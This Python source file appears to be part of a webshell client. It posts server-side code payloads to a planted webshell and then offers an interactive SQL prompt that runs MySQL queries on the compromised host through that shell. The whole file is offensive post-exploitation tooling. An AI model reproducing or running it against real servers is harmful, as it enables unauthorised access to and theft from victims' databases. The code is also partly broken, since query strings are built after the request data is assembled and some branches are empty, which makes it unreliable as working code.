import config.dbConfig as dbC
import requests as res
class databaseManager:
    def __init__(self,con):
        self.con = con

    def Begin(self):
        self.connect = self.con.getUrl()
        self.key = self.con.getKey()
        date = { self.key : self.getBaseCode() }
        re = res.session()
        firstURL=re.post(self.connect,date)
        self.serviceType=firstURL.text
        print("目标主机为:",self.serviceType)
        self.DBMain(re)
        re.close()

    def getBaseCode(self):
        if self.con.getTyp()=="php":
            baseCodeForFile=dbC.PHP_Mysql_BaseCode
        if self.con.getTyp()=="jsp":
            baseCodeForFile=dbC.JSP_Mysql_BaseCode
        if self.con.getTyp()=="asp":
            baseCodeForFile=dbC.ASP_Mysql_BaseCode
        #print(baseCodeForFile)
        return baseCodeForFile

    def DBMain(self,re):
        sqlAddress = input("address(eg:localhost):")
        sqlUser = input("username:")
        sqlPassword = input("password:")
        sqlDatabase = "information_schema"
        if self.con.getTyp()=="php":
            sqlconnect = dbC.PHP_Mysql_Connect.replace('#1',sqlAddress,1)
            sqlconnect = sqlconnect.replace('#2',sqlUser,1)
            sqlconnect = sqlconnect.replace('#3',sqlPassword,1)
            sqlconnectY = sqlconnect.replace('#4',"information_schema",1)
            date = { self.key : sqlconnectY }
            commit = re.post(self.connect,date)
            print(commit.text)
        if self.con.getTyp()=="jsp":
            pass
        if self.con.getTyp()=="asp":
            pass
        while True:
            flag = input("sql >")
            if flag == 'exit':
                break 
            else:
                flag1 = flag.split()
                if flag1[0] == 'use':
                    flag2=flag1[1].split(';')
                    if self.con.getTyp()=="php":
                        sqlconnectY = sqlconnect.replace('#4',flag2[0],1)
                    if self.con.getTyp()=="jsp":
                        sqlDatabase = flag2[0]
                        
                else:
                    if self.con.getTyp()=="php":
                        DBS = dbC.PHP_Mysql_ShowDBs.replace('@@',sqlconnectY,1)
                        date = { self.key : DBS }
                        DBS = DBS.replace('##',flag,1)
                    if self.con.getTyp()=="jsp":
                        date = {
                            self.key:dbC.JSP_Mysql_Connect,
                            "sqlAddress":sqlAddress,
                            "database":sqlDatabase,
                            "user":sqlUser,
                            "password":sqlPassword,
                            "sql":flag,
                            "type":flag.split()[0]
                        }
                    if self.con.getTyp()=="asp":
                        DBS = dbC.ASP_Mysql_ShowDBs.replace('@@',sqlconnectY,1)
                    
                    #print(DBS)
                    
                    commit = re.post(self.connect,date)
                    print(commit.text)
